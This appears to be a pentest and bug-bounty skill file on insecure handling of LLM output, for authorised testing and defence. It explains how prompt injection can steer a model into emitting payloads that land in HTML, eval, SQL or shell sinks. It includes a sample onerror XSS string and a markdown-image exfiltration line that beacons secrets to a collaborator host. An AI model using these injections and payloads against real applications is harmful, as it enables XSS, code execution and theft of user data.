---
name: ai-insecure-output-handling
description: >
  Exploit apps that trust LLM output — pass model text unsanitized into XSS sinks, SQL, shell,
  code, or downstream calls. Load when LLM output is rendered as HTML/markdown, executed, or fed to
  another system. Signals: chatbot output shown with innerHTML/dangerouslySetInnerHTML, "run this
  code", LLM-generated queries/commands, agent output used in eval/exec.
domain: ai-ml
type: technique
stability: learning
modes: [bugbounty, pentest, defense]
severity: high
owasp_llm: [LLM05:2025-Improper-Output-Handling]
cwe: [CWE-79, CWE-94, CWE-78]
tools: [burp]
schema_version: 1
---

# Insecure output handling (LLM → sink)

## When it applies
The app treats LLM output as trusted and passes it into a dangerous sink — rendered as HTML,
executed as code/SQL/shell, or forwarded to another API. The model becomes an injection vector,
especially when its input is attacker-influenced (→ chain with `ai-prompt-injection`).

## Why it works
Developers trust their own model's output, but it's just text — and an attacker can steer it via
prompt injection. If that text lands in `innerHTML`, `eval`, a SQL string, a shell command, or a
system call without sanitization, you get XSS/RCE/SQLi *through* the LLM.

## Method
1. **Find the sink**: where does model output go? HTML render (`innerHTML`, markdown→HTML,
   `dangerouslySetInnerHTML`), code exec (`eval`, code interpreter), DB (LLM-built query), shell,
   or another service call.
2. **Get the model to emit a payload**: via direct or indirect prompt injection, make the output
   contain `<img src=x onerror=alert(document.domain)>`, a `javascript:` link, SQL, or a command.
3. **Route to impact**:
   - Rendered output → **stored/reflected XSS** (fires for the user or others viewing the chat).
   - Code-interpreter/tool → **RCE** (→ `ai-agent-tool-abuse`).
   - LLM-generated SQL/commands executed → **SQLi / command injection**.
4. **Markdown exfil**: model emits `![x](https://collab/?d=<secret>)` → beacons data on render.

## Gotchas
- The bug is in the *app's* handling, not the model — the fix is output encoding/sandboxing, same as any injection.
- Stored XSS via chat history hits every viewer — high impact, easy to miss.
- Combine with prompt injection to reliably control the output; prove real execution, not just odd text.

## Verify success
Model-produced content executes in a sink — XSS firing in the app's origin, code/command execution,
or injected SQL — traceable to LLM output.

## References
OWASP LLM Top 10 (2025) LLM05; PortSwigger "web LLM attacks"; markdown-exfil write-ups.
